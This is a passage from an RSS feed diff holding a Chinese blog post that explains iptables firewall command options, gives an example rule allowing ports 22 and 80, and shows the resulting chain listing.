destination&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Chain OUTPUT (policy ACCEPT)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target     prot opt &lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt;               destination&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;命令参数&lt;/p&gt;
+&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1. -A  添加规则到规则链&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2. -L  列出当前的过滤规则&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3. -m  conntrack 运行过滤规则根据连接状态进行匹配&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4. -p  连接的目标协议&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5. --dport  规则的目标端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6. -j 跳转的特定的目标，iptables一般允许4个目标&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    - ACCEPT 接收数据包并停止本链规则匹配&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    - REJECT 拒绝数据包并提醒发送者，停止规则继续匹配&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    - DROP 静默扔掉数据包，停止规则继续匹配&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    - LOG 记录数据包，继续运行本链中更多的规则&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7. --log-prefix 记录时，将文本放在日志信息前&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8. --log-level 日志使用的系统日志级别，默认为7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9. -i 仅匹配来自特定接口的数据包&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10. -I 插入一条规则&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    -I INPUT 5 插入INPUT链，使其成为第5条规则&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11. -v 在输出中显示更多信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12. -s --source - address[&amp;#x2F;mask] 指定源地址&amp;#x2F;掩码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13. -d --destination - address[&amp;#x2F;mask] 指定目的地&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;三-常用命令解析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#三-常用命令解析&#34;&gt;#&lt;/a&gt; 三、常用命令解析&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;参考博客： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8zMzgyNzM1Mjg2ZTA=&#34;&gt;https://www.jianshu.com/p/3382735286e0&lt;/span&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZnJhbmtiL3AvNzQyNzk0NC5odG1s&#34;&gt;https://www.cnblogs.com/frankb/p/7427944.html&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;样例 1&lt;/p&gt;
+&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;iptables -I INPUT -d xx.xx.xx.x -p tcp -m multiport --dports 22,80 -j ACCEPT&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;结果&lt;/p&gt;
+&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Chain INPUT (policy ACCEPT)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target     prot opt &lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt;               destination&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ACCEPT     tcp  --  anywhere             xx.xx.xx.x.vultr.com  multiport dports ssh,http&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Chain FORWARD (policy ACCEPT)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target     prot opt &lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt;               destination&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Chain OUTPUT (policy ACCEPT)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target     prot opt &lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt;               destination&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;分析&lt;/p&gt;
+&lt;p&gt;向 &lt;code&gt;INPUT&lt;/code&gt;  链中添加了一条规则，接收目标地址为本机地址，端口为 22/80 的数据包，源地址没有指定&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;持久化保存规则 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va2Fpc2hpcmVuc2hpL3AvMTEyMjc2NjMuaHRtbA==&#34;&gt;https://www.cnblogs.com/kaishirenshi/p/11227663.html&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;  我们的问题不在于电视为我们展示具有娱乐性的内容，而在于所有的内容都以娱乐的方式表现出来，这就完全是另外一回事了。&lt;/p&gt;
+&lt;p align=&#34;right&#34;&gt;——《娱乐至死》
+&lt;/blockquote&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
